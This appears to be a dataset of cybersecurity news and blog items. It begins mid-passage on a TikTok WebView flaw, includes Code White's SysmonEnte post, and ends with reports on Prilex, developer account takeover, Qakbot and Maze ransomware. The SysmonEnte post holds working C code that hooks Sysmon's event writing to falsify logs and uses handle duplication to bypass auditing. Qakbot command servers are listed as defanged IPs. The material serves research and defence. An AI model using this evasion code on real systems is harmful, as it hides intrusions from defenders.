sent back to the attacker and, subsequently, the script modifies the user’s biography information to read “!! SECURITY BREACH !!”: Once the attacker’s specially crafted malicious link is clicked by the targeted TikTok user, the attacker’s server, https://www.attacker[.]com/poc, is granted full access to the JavaScript bridge and can invoke any exposed functionality. The attacker’s server returns an HTML page containing JavaScript code to send video upload tokens back to the attacker as well as change the user’s profile biography. The video uploading authentication tokens are sent back to the attacker via an XMLHttpRequest . The attacker also receives the reply body and the header, depicted in Figure 10 and 11 below: Figure 10. The request headers retrieved by the attack Figure 11. The server’s reply including the headers Finally, the message “!! SECURITY BREACH !!!” is set in the user profile’s biography: Figure 12. Compromising the user’s profile integrity JavaScript interface best practices As this case and our prior research has shown, from a programming perspective, using JavaScript interfaces poses significant risks. A compromised JavaScript interface can potentially allow attackers to execute code using the application’s ID and privileges. Thus, we recommend that the developer community be aware of the risks and take extra precautions to secure WebView. In cases where using JavaScript interfaces cannot be avoided, we suggest using an approved list of trusted domains to be loaded to the application’s WebView to prevent loading malicious or untrusted web content. Additionally, we suggest the following secure coding practices: Use the default browser to open URLs that don’t belong to the application’s approved list. Keep the approved list up to date and track the expiration dates of the included domains. This can prevent attackers from hijacking WebView by claiming an expired domain on the approved list. Avoid using partial string comparison methods to compare and verify a URL with the approved list of trusted domains. Avoid adding stage or internal network domains to the approved list as these domains could be spoofed by an attacker to hijack WebView. Responsible disclosure and industry collaboration improves security for all Leveraging new threats, techniques, and attacker capabilities, adversaries continue to focus on identifying and taking advantage of unpatched vulnerabilities and misconfigurations as a vector to access systems and sensitive information for malicious purposes. Responding to the changing threat landscape requires us to expand our knowledge and expertise into other devices and platforms as part of our commitment to continuously improve security from Microsoft, not just for Microsoft. We use collaborative research such as this to improve our protection technologies across platforms, ensuring Microsoft Defender Vulnerability Management detects and alerts on installed applications with known vulnerabilities—including those affecting non-Windows devices. While we’re not aware of any active exploitation of this vulnerability in the wild, users can further follow the security guidelines below to defend against this and similar types of issues: Avoid clicking links from untrusted sources Always keep the device and the installed applications updated Never install applications from untrusted sources Immediately report any strange application behavior to the vendor, such as setting changes triggered without user interaction. As part of our responsible disclosure policy through Coordinated Vulnerability Disclosure (CVD) via Microsoft Security Vulnerability Research (MSVR), we disclosed the vulnerability to TikTok in February 2022 as directed on its website . The vulnerability, CVE-2022-28799 , was quickly rated as high severity with a score of 8.3, and a fix for the issue was included in an updated version of the app released less than a month after the initial disclosure. We wish to thank the TikTok security team for collaborating quickly and efficiently in resolving these issues. This case displays how the ability to coordinate research and threat intelligence sharing via expert, cross-industry collaboration is necessary to effectively mitigate issues. As threats across platforms continue to grow in numbers and sophistication, vulnerability disclosures, coordinated response, and other forms of threat intelligence sharing are needed to help secure users’ computing experience, regardless of the platform or device in use. We will continue to work with the larger security community to share research and intelligence about threats in the effort to build better protection for all. Dimitrios Valsamaras Microsoft 365 Defender Research Team References WebView | Android Developers Remediation for JavaScript Interface Injection Vulnerability – Google Help Mobile deep linking – Wikipedia"
798d7dfb-bf59-58d5-ac93-e49f184e755a,06-September-2022,Attacks on Sysmon Revisited - SysmonEnte,Code white demonstrates an attack on the integrity of Sysmon. The attack generates a minimal amount of observable events. This makes it difficult to detect in environments with no additional security products.,"In this blogpost we demonstrate an attack on the integrity of Sysmon which generates a minimal amount of observable events making this attack difficult to detect in environments where no additional security products are installed. tl;dr: Suspend all threads of Sysmon. Create a limited handle to Sysmon and elevate it by duplication. Clone the pseudo handle of Sysmon to itself in order to bypass SACL as proposed by James Forshaw . Inject a hook manipulating all events (in particular ProcessAccess events on Sysmon). Resume all threads. We also release a POC called SysmonEnte . Background At Code White we are used to performing complex attacks against hardened and strictly monitored environments. A reasonable approach to stay under the radar of the blue team is to blend in with false positives by adapting normal process- and user behavior, carefully choosing host processes for injected tools and targeting specific user accounts. However, clients with whom we have been working for a while have reached a high level of maturity. Their security teams strictly follow all the hardening advice we give them and invest a lot of time in collecting and base-lining security related logs while constantly developing and adapting detection rules. We often see clients making heavy use of Sysmon, along with the Windows Event Logs and a traditional AV solution. For them, Sysmon is the root of trust for their security monitoring and its integrity must be ensured. However, an attacker who has successfully and covertly attacked, compromised the integrity of Sysmon and effectively breaks the security model of these clients. In order to undermine the aforementioned security-setup, we aimed at attacking Sysmon to tamper with events in a manner which is difficult to detect using Sysmon itself or the Windows Event Logs. Attacks on Sysmon and Detection Having done some Googling on how to blind Sysmon, we realized that all publicly documented ways are detectable via Sysmon itself or the Windows Event Logs (at least those we found) : Unloading Sysmon Driver - Detectable via Sysmon event id 255, Windows Security Event ID 4672. Attacks Via Custom Driver - Detectable via Sysmon event id 6, Driver loaded. Kill the Sysmon Service - Sysmon Event ID 10 (Process Access with at least PROCESS_TERMINATE flag set; The last event forwarded by Sysmon). Manipulating the Rules Registry Key - Event ID 16. Patching Sysmon in Memory - Event ID 10. While we were confident that we can kill Sysmon before throwing Event ID 5 (Process terminated) we thought that a host not sending any events would be suspicious and could be observed in a client's SIEM. Also, loading a signed, whitelisted and exploitable driver to attack from Kernel land was out of scope to maintain stability. Since all of these documented attack vectors are somehow detectable via Sysmon itself, the Windows Event Logs or can cause stability issues we needed a new attack vector with the following capabilities: Not detectable via Sysmon itself Not detectable via Windows Event Log Sysmon must stay alive Attack from usermode Injecting and manipulating the control flow of Sysmon seemed the most promising. Attack Description Similarly to SysmonQuiet or EvtMute , the idea is to inject code into Sysmon which redirects the execution flow in such a way that events can be manipulated before being forwarded to the SIEM. However, the attack must work in such a way that corresponding ProcessAccess events on Sysmon are not observable via Sysmon or the Event Log. This presents various problems, but let us first see where such a hook would be applicable. Manipulating the Execution Flow Sysmon forwards events to ETW subscribers via the documented function ntdll!EtwEventWrite . This is easily observable by setting an appropriate breakpoint. The function has the following prototype: ULONG EVNTAPI EtwEventWrite( __in REGHANDLE RegHandle, __in PCEVENT_DESCRIPTOR EventDescriptor, __in ULONG UserDataCount, __in_ecount_opt(UserDataCount) PEVENT_DATA_DESCRIPTOR UserData ); The two most important arguments to the function are EventDescriptor and UserData . typedef struct _EVENT_DESCRIPTOR { USHORT Id; UCHAR Version; UCHAR Channel; UCHAR Level; UCHAR Opcode; USHORT Task; ULONGLONG Keyword; } EVENT_DESCRIPTOR, *PEVENT_DESCRIPTOR; The Id field of the EVENT_DESCRIPTOR determines the type of event and is important to apply the correct struct definition for the event data pointed to by PEVENT_DATA_DESCRIPTOR . The structs for the different events are obviously different for each Sysmon Event Id, as different fields and information are included. Our injected code must thus be able to apply the correct struct depending on which event is being emitted by Sysmon. But how do we know the definition of the event structs? Luckily, ETW Explorer has already documented the event definitions: A definition for the userdata struct describing a ProcessAccess event might therefore look as follows: typedef struct _ProcessAccess { wchar_t* pRuleName; size_t sizeRuleName; wchar_t* pUtcTime; size_t sizeUtcTime; void* psrcGUID; size_t sizesrcguid; void* ppidsrc; size_t sizepidsrc; void* ptidsrc; size_t sizetidsrc; wchar_t* psourceimage; size_t sizesourceimage; void* ptarGUID; size_t sizetarGUID; void* ppiddest; size_t sizepiddest; wchar_t* ptargetimage; size_t sizetargetimage; PACCESS_MASK pGrantedAccess; size_t sizeGrantedAccess; wchar_t* pCalltrace; size_t sizecalltrace; wchar_t* pSourceUser; size_t sizeSourceUser; wchar_t* pTargetUser; size_t sizetargetUser; } ProcessAccess, *PProcessAccess; We can validate this in x64dbg by setting a breakpoint at ntdll!EtwEventWrite and applying the said struct definition for a ProcessAccess event. Faking events ntdll!EtwEventWrite being responsible for forwarding events is a good place to install a hook to redirect the control flow to injected code which first manipulates the event and then forwards it: The injected code manipulating the events might look like this: //Hooked EtwEventWrite Function ULONG Hook_EtwEventWrite (REGHANDLE RegHandle, PCEVENT_DESCRIPTOR EventDescriptor, ULONG UserDataCount, PEVENT_DATA_DESCRIPTOR UserData) { //Get the address of the EtwEventWriteFull Function _EtwEventWriteFull EtwEventWriteFull = (_EtwEventWriteFull)getFunctionPtr(CRYPTED_HASH_NTDLL, CRYPTED_HASH_ETWEVENTWRITEFULL); if (EtwEventWriteFull == NULL ) { goto exit ; } //Check if it is a process access event and needs to be tampered with switch (EventDescriptor->Id) { case EVENT_PROCESSACCESS: HandleProcessAccess((PProcessAccess)UserData); break ; default : break ; } //Save the event with the EtwEventWriteFull Function EtwEventWriteFull(RegHandle, EventDescriptor, 0 , NULL , NULL , UserDataCount, UserData); exit : return 0 ; } // Make ProcessAccess events targeting Sysmon itself look benign VOID HandleProcessAccess (PProcessAccess pProcessAccess) { ACCESS_MASK access_mask_benign = 0x1400 ; PCWSTR wstr_sysmon = L""Sysmon"" ; PCWSTR wstr_ente = L""Ente"" ; //Sysmon check psysmon = StrStrIW(pProcessAccess->ptargetimage, wstr_sysmon); if (psysmon != NULL ) { //Replace the access mask with 0x1400 *pProcessAccess->pGrantedAccess = access_mask_benign; pProcessAccess->sizeGrantedAccess = sizeof (access_mask_benign); //Replace the Source User with Ente lstrcpyW(pProcessAccess->pSourceUser, wstr_ente); pProcessAccess->sizeSourceUser = sizeof (wstr_ente); } } Note, how ntdll!EtwEventWriteFull is used to forward every event. Since we know where to inject the hook and what the UserData structs look like, we are now able to tamper with every Sysmon event before it is forwarded. However, the injection into Sysmon remains observable and the corresponding ProcessAccess event is the last event we do not control. Detection of Process Manipulation OpenProcess Access event In order to create a handle to Sysmon which allows us to conduct process injection of any kind, we need to open Sysmon with at least the following access mask: PROCESS_VM_OPERATION | PROCESS_VM_WRITE . As Sysmon has not yet been modified while we open this handle, a suspicious ProcessAccess Event is generated which is an IOC defenders could hunt for: Handle Elevation Playing with kernel32!DuplicateHandle for another project , we noticed that MSDN states something very interesting: In some cases, the new handle can have more access rights than the original handle. Thus, by first creating a handle with a very limited access mask and then duplicating this handle with a new access mask, we technically do not create a new handle with a high access mask. HANDLE hSysmon = NULL ; HANDLE hhighpriv = NULL ; BOOL bsuccess = FALSE; hSysmon = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 3340 ); bsuccess = DuplicateHandle(GetCurrentProcess(), hSysmon, GetCurrentProcess(), &hhighpriv, PROCESS_ALL_ACCESS, FALSE, 0 ); Sysmon, (to the best of our knowledge) only using OB_OPERATION_HANDLE_CREATE , only sees the benign access mask, but not the duplication of the handle with a higher access mask: Using handle elevation we can gain handles with arbitrary process access masks to arbitrary (non-ppl) processes while Sysmon only logs the instantiation of the original handle. Great Success! Unfortunately, there are some problems: This only works if the targeted process runs as the same user as the duplicating process. This can be easily circumvented by stealing a token from a System process. We steal the token from an elevated svchost process running as System by only using a PROCESS_QUERY_LIMITED_INFORMATION mask, where we do not need the SE_DEBUG privilege which is often used in detection rules. System Access Control Lists (SACL) . This is a bigger problem Detection via System Access Control Lists (SACL) Unfortunately, it is still possible to observe the duplication of the handle by configuring Object Access Auditing using a SACL on Sysmon. The following screenshot shows how ProcessHacker is leveraged to configure the SACL: With this SACL, event 4656 is generated by the Windows Event Log Service upon creation of a handle to Sysmon allowing to write in its memory. This event is also emitted, if handle elevation is used . Note: In the default config, Object Access Auditing is not enabled. SACL Bypass by James Forshaw Fortunately for us, James Forshaw published a great blogpost on how to evade SACL . According to the post, we can duplicate the pseudo handle of a different process to itself to get full access to the process without triggering Object Access Auditing. A stealthy way to gain a handle suitable for process injection would be the following: Open a process handle to Sysmon with a very limited access mask (A detection rule based on this would generate too many false positives) Elevate this handle using ntdll!DuplicateObject to hold the PROCESS_DUP_HANDLE right (Bypasses Sysmon's telemetry) Use the elevated handle to duplicate the pseudo Handle of Sysmon (Bypasses SACL). uPid.UniqueProcess = dwPid; uPid.UniqueThread = 0 ; ntStatus = NtOpenProcess(&hlowpriv, PROCESS_QUERY_LIMITED_INFORMATION, &ObjectAttributes, &uPid); if (!NT_SUCCESS(ntStatus)) FATAL( ""[-] Failed to open low priv handle to sysmon\n"" ); ntStatus = NtDuplicateObject(NtCurrentProcess(), hlowpriv, NtCurrentProcess(), &hduppriv, PROCESS_DUP_HANDLE, FALSE, 0 ); if (!NT_SUCCESS(ntStatus)) FATAL( ""[-] Failed to elevate to handle with PROCESS_DUP_HANDLE rights\n"" ); ntStatus = NtDuplicateObject(hduppriv, NtCurrentProcess(), NtCurrentProcess(), &hhighpriv, PROCESS_ALL_ACCESS, FALSE, 0 ); if (!NT_SUCCESS(ntStatus)) FATAL( ""[-] Failed to elevate to handle with PROCESS_ALL_ACCESS rights\n"" ); Doing so we gain a full access handle to Sysmon while bypassing Sysmon's telemetry and SACL . Fine Tuning There was one last IOC we could come up with. Sysmon can only observe the creation of a limited handle to itself, however, following the golden rule of never touching disk, our tool being unpacked or injected into another process will have a broken calltrace containing unknown sections. Since Sysmon has not been tampered with at this point, this would be the last event which we do not have under control and might be sufficient to create a detection rule upon! We can delay the forwarding of this event by suspending all threads of Sysmon. The events are then queued and dispatched only after we resume the threads, giving us enough time to install a hook manipulating all ProcessAccess events on Sysmon itself. This is possible, because no events for accessing, suspending or resuming a thread exist in Sysmon. The hook then necessarily spoofs the callstack included in the ProcessAccess event. Putting It All Together We combined all of these steps into a tool we call SysmonEnte which you can find on our Github . SysmonEnte is implemented as fully position independent code (PIC) which can be called using the following prototype: DWORD go (DWORD dwPidSysmon) ; A sample loader is included and built during compilation when typing make . Additionally, SysmonEnte uses indirect syscalls to bypass userland hooks while injecting into Sysmon. The open source variant tampers with process access events to Lsass and Sysmon and sets the access mask to a benign one. Additionally, the source user and the callstack is set to Ente . You can change these to your needs. Possible Detection Methods Certain detection ideas exist from our point of view: ETW TI The easiest solution would be to subscribe to the Threat Intelligence ETW provider to observe injections or suspicious code manipulations. This however requires a signed ELAM driver. Kernel Callbacks If you have the possibility to run as a kernel driver you can probably implement the callback for the OB_OPERATION_HANDLE_DUPLICATE to monitor for Object Access Auditing Bypasses. https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_ob_operation_registration Object Access Auditing If you have the possibility to enable Object Access Auditing, you can configure a SACL for Sysmon to monitor the duplication of handles to catch the SACL bypass used to gain a handle to Sysmon. We are not sure about false positives in large environments though. To the best of our knowledge, and in contrast to SACLs for filesystem- or registry operations, configuring Object Access Auditing on processes is only achievable by writing a custom program. This circumstance makes the detection of handle duplication via SACL non-trivial. A sample program is included on our Github and configures a SACL with ACCESS_SYSTEM_SECURITY + PROCESS_DUP_HANDLE + PROCESS_VM_OPERATION and is applied to the group Everyone . ACCESS_SYSTEM_SECURITY is included as otherwise, attackers can covertly change the SACL. With this configuration, attempts to duplicate a handle to Sysmon should become visible. Note: Object Access Auditing is not enabled by default and must be enabled via Group Policy prior the use of the tool. Final Words Sysmon on it's own is not able to protect itself sufficiently, and it is difficult to observe the described attack with the event log. We believe that running Sysmon alone, without any protection from a trusted third party tool sitting in kernel land or running as a PPL, is not guaranteed to produce reliable logs with ensured integrity. A possible fix by Microsoft would be to allow running Sysmon as a PPL. It is noteworthy that the described technique of handle elevation + SACL bypass can also be used to stealthily dump Lsass. After our talk at X33fcon , nanodump supports handle elevation as well. However, a SACL with PROCESS_VM_READ is configured for Lsass by default. ;-) References https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon https://github.com/matterpreter/Shhmon https://github.com/bats3c/Ghost-In-The-Logs https://www.darkoperator.com/blog/2018/10/5/operating-offensively-against-sysmon https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing https://www.tiraniddo.dev/2017/10/bypassing-sacl-auditing-on-lsass.html https://docs.microsoft.com/en-us/windows-hardware/test/weg/instrumenting-your-code-with-etw https://github.com/ScriptIdiot/SysmonQuiet https://github.com/bats3c/EvtMute"
0c2625bb-0252-57fd-a274-a06ded9038dc,29-September-2022,Brazilian Prilex Hackers Resurfaced With Sophisticated Point-of-Sale Malware,A Brazilian threat actor known as Prilex resurfaces with advanced malware to steal money. Kaspersky researchers say the group has resurfaced after a year-long hiatus. Prilex has been active since 2014 with ATM-focused malware attacks in Brazil.,"A Brazilian threat actor known as Prilex has resurfaced after a year-long operational hiatus with an advanced and complex malware to steal money by means of fraudulent transactions. ""The Prilex group has shown a high level of knowledge about credit and debit card transactions, and how software used for payment processing works,"" Kaspersky researchers said . ""This enables the attackers to keep updating their tools in order to find a way to circumvent the authorization policies, allowing them to perform their attacks."" The cybercrime group emerged on the scene with ATM-focused malware attacks in the South American nation, providing it the ability to break into ATM machines to perform jackpotting – a type of attack aiming to dispense cash illegitimately – and clone thousands of credit cards to steal funds from the targeted bank's customers. Prilex's modus operandi over the years has since evolved to take advantage of processes relating to point-of-sale (PoS) software to intercept and modify communications with electronic devices such as PIN pads , which are used to facilitate payments using debit or credit cards. Known to be active since 2014, the operators are also adept at carrying out EMV replay attacks in which traffic from a legitimate EMV-based chip card transaction is captured and replayed to a payment processor like Mastercard, but with the transaction fields modified to include stolen card data. Infecting a computer with PoS software installed is a highly-targeted attack incorporating a social engineering element that allows the threat actor to deploy the malware. ""A target business may receive a call from a 'technician' who insists that the company needs to update its PoS software,"" the researchers noted. ""The fake technician may visit the target in person or request the victims to install AnyDesk and provide remote access for the 'technician' to install the malware."" The latest installments spotted in 2022, however, exhibit one crucial difference in that the replay attacks have been substituted with an alternative technique to illicitly cash out funds using cryptograms generated by the victim card during the in-store payment process. The method, called GHOST transactions, includes a stealer component that grabs all communications between the PoS software and the PIN pad used for reading the card during the transaction with the goal of obtaining the card information. This is subsequently transmitted to a command-and-control (C2) server, permitting the threat actor to make transactions through a fraudulent PoS device registered in the name of a fake company. Now, it's worth pointing out that EMV chip cards use what's called a cryptogram to secure cardholder data every time a transaction is made. This is done so as to validate the identity of the card and the approval from the card issuer, thereby reducing the risk of counterfeit transactions. While previous versions of Prilex circumvented these security measures by monitoring the ongoing transaction to get the cryptogram and conduct a replay attack using the collected ""signature,"" the GHOST attack requests for new EMV cryptograms that are put to use to complete the rogue transactions. Also baked into the malware is a backdoor module that's engineered to debug the PoS software behavior and make changes on the fly. Other backdoor commands authorize it to terminate processes, start and stop screen captures, download arbitrary files from the C2 server, and execute commands using CMD. Prilex is ""dealing directly with the PIN pad hardware protocol instead of using higher level APIs, doing real-time patching in target software, hooking operating system libraries, messing with replies, communications and ports, and switching from a replay-based attack to generate cryptograms for its GHOST transactions even from credit cards protected with CHIP and PIN technology,"" the researchers said."
86e840e0-c115-5a3b-8c28-096050bee5d3,04-October-2022,Developer account body snatchers pose risks to the software supply chain,"Software supply chain attacks have increased in frequency, says Cisco Talos. Talos says they are becoming more common among cyber criminals. Software developers' email addresses can be used to take over developer accounts. Talo's research looked at security of source code repositories.","By Jaeson Schultz . Over the past several years, high-profile software supply chain attacks have increased in frequency. These attacks can be difficult to detect and source code repositories became a key focus of this research. Developer account takeovers present a substantial risk to the software supply chain because attackers who successfully compromise a developer account could conceal malicious code in software packages used by others. Talos analyzed several of the major software repositories to assess the level of developer account security, focusing specifically on whether developer accounts could be recovered by re-registering expired domain names and triggering password resets. Many software repositories have already begun taking steps to enhance the security of developer accounts. Talos has identified additional areas where the security of developer accounts could be improved. Talos worked with vulnerable repositories to resolve issues that we found. Software supply chain attacks, once the exclusive province of sophisticated state-sponsored attackers , have been gaining popularity recently among a broader range of cyber criminals. Attackers everywhere have realized that software supply chain attacks can be very effective, and can result in a large number of compromised victims. Software supply chain attacks more than tripled in 2021 when compared with 2020. Why are software supply chain attacks so effective? Organizations that possess solid cyber defenses may be difficult to attack directly. However, these same organizations are likely vulnerable to a software supply chain attack because they still regularly run/build software obtained from vendors who are trusted. Rather than attacking an entire software repository itself, or identifying an unpatched vulnerability in a software package, compromising the software supply chain can be as simple as attacking the accounts of the package developers and maintainers. Most software repositories track the identities of their software developers using those developers' email addresses. If a cybercriminal somehow gains access to a developer's email account, the attacker can theoretically generate password reset emails at these software repositories and take over the account belonging to that developer. Once inside, an attacker could then publish malicious updates to the code maintained by that developer, affecting every other piece of software that uses that library from then on. Cisco Talos examined several frequently used code repositories. We looked specifically at the security afforded to developer accounts, and how difficult it would be for an attacker to take over a developer account. While some repositories had stringent security in place, others did not. Fortunately, worked with the managers of these repositories to resolve the major issues we found. Risks in the software supply chain Re-inventing the wheel is typically not a good idea. This holds true for many things, including developing software. Much software written today depends on third-party packages and software libraries to facilitate necessary functionality contained in the program. Utilizing third-party libraries and packages, especially open source, also speeds up development and lowers costs. Popular software packages have also become attractive targets for attackers. The more popular a software library is, the more external software will be using that library, and thus, the larger the potential attack surface. Compromising a software library can potentially compromise every other piece of software that relies on that software library for its functionality. This is the risk inherent in the software supply chain. With the exception of language-agnostic repositories like GitHub , most software repositories tend to be language specific. For example, JavaScript authors rely mostly on NPM , Python developers have PyPI , Perl programmers can often be found using packages obtained via CPAN , and so on. Each software repository sets its own rules when it comes to developers' accounts. Additionally, as many programmers are aware, some programming languages make a better choice for solving certain types of problems. For example, embedded systems drivers are more commonly written in C instead of Perl, while parsing text is more commonly done in Perl or Python, rather than C. This means that the process of writing programs that integrate third-party libraries into the code will also be different for each language. It is difficult to imagine a developer integrating a third-party library into a system-level driver written in C without carefully reviewing the related code and testing it for speed and functionality. However, when developing a feature-rich Perl proof-of-concept application or a web-based JavaScript application, this might not always be the case. A programmer in those instances might conceivably import a package first and ask questions later. This means some software repositories will carry more risk than others when it comes to malware hiding in the source code. NPM Node Package Manager is a JavaScript software repository and has been the subject of some ""independent"" security audits recently. There has been a lot of discussion online, especially concerning the security of the developer accounts there, and how easy it is to take over these accounts by re-registering expired email domains. There are more than 2 million packages in the NPM repository. Conveniently, an NPM package called ""all-the-package-names"" contains a list of all packages in the NPM repository. Each individual package at NPM has associated metadata, such as a text description of the package, a link to the package tarball, and a list of the package maintainers. Most importantly, the list of package maintainers has the developer's username and email address. Iterating through all the package names, and extracting the email addresses, then further extracting the domain names from those email addresses, provides the raw data necessary to find developer accounts associated with expired domains. Once an expired domain is found, it can be re-registered and theoretically used to take over the NPM developer account. But does it work this way in practice? Although we found a couple thousand expired developer account domain names, we could not recover the associated developer accounts. It appears the ""couple things in place to protect against [account takeover]"" that NPM administrator @MylesBorins mentioned in his tweet above are working as planned. Stale metadata helps foil attackers NPM provides developers with the ability to update the email address associated with their accounts. When a developer decides to switch email addresses, only the future package/version's metadata will contain the new email address. NPM does not retroactively update old metadata associated with a package that was previously published. This means that, even though someone looking to take over an NPM developer account might find package metadata indicating a developer with an expired email domain, it could simply be that the developer has updated their NPM account to a new email address. This was the case in May 2022, when a security researcher claimed to have taken over the NPM package ""foreach"" by re-registering the email domain belonging to the NPM developer. Unbeknownst to the security researcher, the developer in question had actually updated their NPM account to use their Gmail address instead. So if any password recovery attempts were made, they would have failed — NPM would have generated and sent the password reset emails to the new Gmail account on file, which is still under the original developer's control. PyPI PyPI is the Python Package Index and currently contains almost 400,000 projects. Developers at PyPI have email addresses associated with their accounts, however, PyPI does not display the email address publicly by default. This is an option that the developer must explicitly choose to enable. Many developers are, of course, eager to interact with others who are running their code, so it is no surprise that large numbers of developers enable this feature. PyPI accounts do not come with MFA enabled by default, so this is something else a developer would have to choose to enable. However, in July 2020 PyPi announced that it was rolling out mandatory MFA to ""critical projects,"" a.k.a. the top 1% of the projects at PyPi (based on the number of downloads). A list of all PyPI packages is available online. Many of these packages contain a mailto: link containing an email address. There is also a list of maintainers of the package. For developers that expose their email addresses publicly, it's found on the user's public profile page. It is a relatively simple process to scrape the email addresses associated with PyPI projects. PyPI reveals whether an email address is associated with an account (but it probably should not). Account takeovers have been a problem at PyPI in the past. As recently as May 14, 2022, an attacker managed to take over a developer account and replaced the ""ctx"" package , adding malicious code that stole the user's environment variables, base64-encoded them and transmitted the data back to the attacker's C2 server. Fortunately, the changes made by the admins over at PyPI seem to be moving account security in the right direction. CPAN The Comprehensive Perl Archive Network (CPAN) contains more than 200,000 Perl modules. CPAN also provides an index of all the module authors. The individual module authors each have their own ""homepage"" that lists their contributed modules. For anyone who wants to reach out to the dev, CPAN includes the author's email address. A motivated attacker can easily scrape the CPAN website for a list of all author IDs and use those to scrape the email address belonging to the developers. A whois search on the email domain of the developer email addresses provides us with a list of developer accounts that are vulnerable to account takeover. From there, all that is required is standing the domain up somewhere and running a mail server. Triggering a password reset provides us with the magic link to get into the developer's account. Talos has reached out to the admins at CPAN and provided them with a list of the vulnerable developer accounts we found. CPAN has disabled these accounts. NuGet NuGet is a software repository for .NET developers. The NuGet ""gallery"" contains more than 317,000 packages. Fortunately, registered developers at NuGet have their email addresses hidden by default. There is an option to allow users to contact you, using a form on the NuGet website that does not disclose the email address of the developer. Developers have the option of adding their Twitter handle, and many developers do. If an attacker wishes to attack NuGet developers en masse, they would have a very difficult time assembling a list of developer email addresses. RubyGems RubyGems is a software repository for Ruby developers. There are currently approximately 172,000 gems (packages) in the repository. Developer email addresses are hidden from the public by default. Even unchecking the ""Hide email in public profile"" check box has no discernable effect, and the email address remains hidden. Some gems have ""maintainers"" files to indicate the contact email addresses of the developers, but this is not consistent across gems. Recently, the RubyGems team announced that they are enforcing MFA for top developer accounts. Conclusion The software supply chain attack problem is not likely to go away anytime soon. It is unreasonable to ask organizations to vet every piece of software that runs in their environment. Some amount of trust in software vendors and suppliers will always be necessary. However, that doesn't mean that defenders are helpless against these types of attacks. Organizations should analyze what software is required on various internal systems. Many times, there may be opportunities to segment a group of systems running a particular piece of software from the rest of the internal network. This way, any compromise that occurs as a result of a software supply chain attack will be limited in scope. Obviously, there are limitations to this approach. All parties in the software supply chain need to take more responsibility for security. For example, it would be far safer for software repositories to stop publishing or releasing any information related to a developer's email address. Yes, this is arguably a bit of security-by-obscurity, but it forces attackers to go elsewhere to correlate the email account of a developer with the particular software package in question, and greatly enhances the security of the repository. If a repository wishes to publish a developer's email address, it could instead give each developer an email address at the domain of the repository itself (ex., @npmjs.com, @cpan.org, etc.). Forcing MFA on the most popular package maintainers also seems to be a sensible remedy that is currently being pursued by several repositories. However, security is always a delicate balance. If you sacrifice too much usability in the pursuit of security, developers may rebel, as was the case with PyPI developer ""untitaker."" One sure-fire countermeasure against developer account takeover via expired domain registration is code signing. This is really the best way to be sure that the code you use has not been tampered with since it was last signed, and is indeed from a developer you trust. An attacker who gets control of a developer's expired domain name would have no way to recover the code signing keys belonging to that developer and no way to impersonate that developer."
f2db5d34-2c44-598f-bc5a-f19f451190dc,04-July-2022,Ongoing Qakbot Campaign,ESentire has observed a significant increase in Qakbot malware infections through June 2022. threat actors employ HTML smuggling and password protected ZIP archives to bypass email-based security detections. eSentire says the malware has been observed leading to the delivery of multiple ransomware variants.,"eSentire has observed a significant increase (see Figure 1) in Qakbot (Qbot) malware infections through the month of June 2022. Qakbot is an information stealing malware. In observed attacks, threat actors employ HTML smuggling (see Figure 2) and password protected ZIP archives to bypass email-based security detections. User interaction is required for successful malware execution. Observations of Qakbot are highly concerning as the malware has been observed leading to the delivery of multiple ransomware variants. eSentire is sharing details on these attacks, including indicators of compromise, to increase awareness of this threat across our customers. Qakbot malware has been in active use since at least 2008. Initially the malware was used to steal victim data, but in recent years it has functioned primarily for reconnaissance and ransomware delivery. In recently observed attacks, threat actors sent emails containing .Zip archives to potential victims. Email lures commonly relate to employee compensation. It should be noted that some recent incidents have involved email thread hijacking. This is a technique where threat actors respond to previously compromised email threads with malicious content. As the email was previously part of a legitimate conversation, it is much less likely to arouse suspicion. In the recent cases, the delivered .Zip archive contains a malicious Windows Shortcut (.LNK) file; if interacted with, the .LNK file executes a command to download and execute a Qakbot payload. Successful execution of Qakbot leads to connections to attacker Command-and-Control (C2) servers, downloading additional files to the infected hosts, and performing reconnaissance tasks. eSentire has observed a Qakbot infection rapidly leading to the deployment of Cobalt Strike, a red-team tool commonly used prior to ransomware deployment. The eSentire Threat Intelligence team assesses with high confidence that this is an ongoing campaign. eSentire Threat Intelligence team assesses with high confidence that infections will continue through July 2022. 1[.]161[.]81[.]21 113[.]53[.]152[.]11 121[.]7[.]223[.]45 138[.]186[.]28[.]253 148[.]64[.]96[.]100 162[.]241[.]60[.]240 185[.]198[.]59[.]103 185[.]94[.]99[.]174 189[.]78[.]107[.]163 193[.]29[.]104[.]123 213[.]109[.]192[.]61 23[.]29[.]125[.]210 39[.]49[.]71[.]64 41[.]228[.]22[.]180 47[.]156[.]129[.]52 50[.]116[.]87[.]228 66[.]70[.]218[.]63 69[.]14[.]172[.]24 71[.]13[.]93[.]154 84[.]246[.]85[.]56 85[.]17[.]9[.]19 91[.]199[.]147[.]183 91[.]234[.]254[.]106 Figure 1: Timeline of Qakbot observations Figure 2: HTML Smuggling Technique [1] https://attack.mitre.org/techniques/T1027/006/"
3095673d-a8c6-5861-84b2-198088467d82,06-November,Trying not to walk in the dark woods. A way out of the Maze,Maze Team has claimed the end of its ransomware attacks. Maze Team is responsible for the development and maintenance of Maze Ransomware. The group was the first adversary to adopt the Double Extortion technique.,"After numerous ransomware attacks since its appearance in May 2019 , the popular Maze Team recently claimed the end of its criminal activity through a press release on its Dedicated Leak Site . The Maze Team is responsible for the development and maintenance of Maze Ransomware , one of the most advanced and infamous piece of malware in today’s threat landscape, and has been the first adversary to adopt the Double Extortion technique, which allows attackers to maximize their chance of making profit asking ransom payment both from operation recovering and from avoiding the disclosure of stolen data. Indeed, while for a period of time other threat actors had only threatened to release stolen information if the ransom wouldn’t get paid, Maze Team first created a DLS ( Dedicated Leak Site ) where to publish data if victims refuse to pay or were not collaborative. On 01/11/2020 Maze Team claimed its project has officially closed. However, it posed a very serious threat to many organizations and for this reason, in March 2020 , Telsy Threat Intelligence Research Team developed and tested a vaccine to prevent files encryption operated by variants of popular Maze Ransomware . This vaccine has been made available to Telsy customers, to some Italian and international entities operating in the healthcare sector and has been released on closed communities to trusted individuals only. Download the full report below: pdf 1 Check more related articles on our blog ."
